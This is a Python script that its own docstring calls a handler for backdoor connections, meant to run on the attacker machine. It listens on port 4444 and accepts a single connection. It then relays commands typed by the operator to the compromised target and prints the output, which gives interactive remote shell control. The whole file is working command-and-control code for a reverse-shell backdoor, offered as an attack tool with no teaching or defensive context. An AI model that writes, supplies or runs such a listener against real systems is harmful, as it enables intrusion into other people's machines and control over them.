#!/usr/bin/env python3
"""
Listener/Handler for backdoor connections
Run this on the attacker machine to receive connections
"""
import socket
import sys

class Listener:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server = None
        self.client = None
        
    def start(self):
        """Start listening for connections"""
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(1)
            
            print(f"[*] Listener started on {self.host}:{self.port}")
            print("[*] Waiting for connection...")
            
            self.client, address = self.server.accept()
            print(f"[+] Connection received from {address[0]}:{address[1]}")
            
            self.handle_connection()
            
        except KeyboardInterrupt:
            print("\n[!] Listener stopped by user")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            self.close()
    
    def handle_connection(self):
        """Handle the backdoor connection"""
        print("\n[*] Shell access established. Type 'exit' to close connection.")
        print("[*] Type 'help' for available commands.\n")
        
        while True:
            try:
                # Get command from user
                command = input("shell> ").strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    self.client.send(command.encode())
                    print("[*] Closing connection...")
                    break
                
                if command.lower() == 'help':
                    self.show_help()
                    continue
                
                # Send command to target
                self.client.send(command.encode())
                
                # Receive output
                output = self.client.recv(4096).decode()
                print(output)
                
            except KeyboardInterrupt:
                print("\n[!] Interrupted by user")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                break
    
    def show_help(self):
        """Show available commands"""
        help_text = """
Available Commands:
  ls / dir          - List directory contents
  pwd / cd          - Show/change current directory
  whoami            - Show current user
  cat <file>        - Display file contents
  ps / tasklist     - List running processes
  exit              - Close connection
  
Any valid shell command can be executed.
        """
        print(help_text)
    
    def close(self):
        """Close connections"""
        if self.client:
            self.client.close()
        if self.server:
            self.server.close()
        print("[*] Listener closed")

if __name__ == '__main__':
    # Allow custom port via command line
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 4444
    
    listener = Listener(port=port)
    listener.start()
